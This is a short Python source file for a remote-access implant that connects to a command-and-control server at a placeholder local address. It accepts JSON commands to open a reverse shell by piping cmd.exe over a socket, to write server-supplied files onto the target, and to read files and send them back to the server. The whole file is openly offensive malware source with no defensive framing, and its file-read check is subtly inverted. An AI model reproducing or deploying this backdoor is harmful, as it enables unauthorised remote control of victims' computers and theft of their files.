import socket, os, threading, subprocess, json

HOST = "127.0.0.1" # C2 Server IP
PORT = 6969 # C2 application port


def send_data(conn, data):
    """Sends data back to the C2 server"""
    data = json.dumps(data)
    conn.send(data.encode())

def download_data(path):
    """Function for the data download"""
    if os.path.isfile(path):
        return '0'
    try:
        f = open(path)
        data = f.read()
    except OSError as e:
        return e
    return data

def upload_data(data, path):
    """Function for the data upload"""
    try:
        f = open(path, 'w')
        f.write(data)
        f.close()
    except OSError as e:
        return e
    return '1'


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT)) # Connect to the C2 server
    print("Connected!!!")
    while True:
        data = json.loads(sock.recv(1024).decode())
        print(data)
        match data[0]:
            case "shell": # Opens a reverse shell on the host to the server
                p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
                s=socket.socket()
                s.connect((HOST, data[1])) # Connecting to the server with a shell channel
                threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start() # Starting a thread to read console output
                threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start() # Starting a thread to input commands from server
            
            case 'upload': # Sending a file from the server to the target
                ret = upload_data(data[1], data[2])
                try:
                    send_data(sock, ret)
                except ConnectionError as e:
                    pass

            case 'download': # The server requests a file from the target
                ret = download_data(data[1])
                try:
                    send_data(sock, ret)
                except ConnectionError as e:
                    pass